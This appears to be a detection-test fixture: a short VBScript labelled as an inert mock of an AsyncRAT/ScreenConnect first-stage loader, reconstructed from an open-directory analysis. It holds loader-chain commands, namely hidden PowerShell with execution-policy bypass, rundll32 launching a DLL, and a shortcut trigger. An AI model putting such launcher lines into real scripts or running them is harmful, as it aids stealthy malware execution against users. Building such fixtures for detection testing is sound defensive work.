' Mock first-stage launcher (Ab.vbs) — reconstructed from Hunt.io open-directory
' analysis. Tests AsyncRAT_ScreenConnect_SEO_LoaderShape. Inert / non-functional.

Set sh = CreateObject("WScript.Shell")

' Pull and assemble the staged blobs from the open directory
files = Array("pe.txt", "q.txt", "1.txt", "logs.idk", "logs.idr")

' Drop the loader chain and trigger it via the weaponized shortcut
sh.Run "powershell -w hidden -ep bypass -File Skype.ps1", 0, False
sh.Run "rundll32 libPK.dll,Execute AppLaunch.exe", 0, False
sh.Run "Microsoft.lnk", 0, False
